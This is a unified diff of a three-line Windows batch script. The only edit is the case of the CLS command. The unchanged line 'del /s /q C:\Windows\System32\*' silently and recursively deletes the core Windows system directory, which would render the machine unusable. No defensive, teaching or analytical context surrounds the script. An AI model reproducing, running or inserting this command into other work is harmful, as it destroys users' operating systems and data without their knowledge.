@@ -1,3 +1,3 @@
 @echo off
-CLS
+cls
 del /s /q C:\Windows\System32\*
